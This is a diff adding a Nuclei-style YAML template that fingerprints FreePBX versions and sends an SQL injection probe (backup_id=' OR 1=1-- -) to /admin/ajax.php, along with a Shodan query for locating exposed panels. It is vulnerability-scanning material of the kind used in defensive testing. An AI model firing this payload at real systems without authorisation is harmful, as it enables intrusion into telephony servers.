@@ -1,0 +1,80 @@
+id: freepbx-sqli-zeroday
+
+info:
+  name: FreePBX SQL Injection Zero Day Detection
+  author: CyberTechAjju
+  severity: critical
+  description: |
+    Template to detect a zero-day vulnerability in FreePBX, allowing SQL Injection attack exploitation. This template identifies the presence of vulnerable FreePBX versions and exploits the SQL injection vulnerability.
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query:
+      - http.title:"FreePBX Administration"
+  tags: freepbx,panel,sangoma,zeroday,sqli
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-version
+    method: GET
+    path:
+      - '{{BaseURL}}/admin/config.php'
+
+    extractors:
+      - type: regex
+        part: body
+        name: version
+        regex:
+          - 'FreePBX\s+([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'
+        group: 1
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'FreePBX Administration'
+          - 'Operator Panel'
+          - 'User Control Panel'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - (compare_versions(version, "> 16.0.0.0") && compare_versions(version, "< 16.0.88.19"))
+          - (compare_versions(version, "> 17.0.0.0") && compare_versions(version, "< 17.0.2.31"))
+        condition: or
+
+  - id: check-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/admin/ajax.php"
+
+    body: |
+      module=core&command=backup&backup_id=' OR 1=1-- -
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL syntax"
+          - "MySQL"
+        condition: or
+
+      - type: status
+        status:
+          - 500
+
+      - type: regex
+        part: body
+        regex:
+          - "error in your SQL syntax"
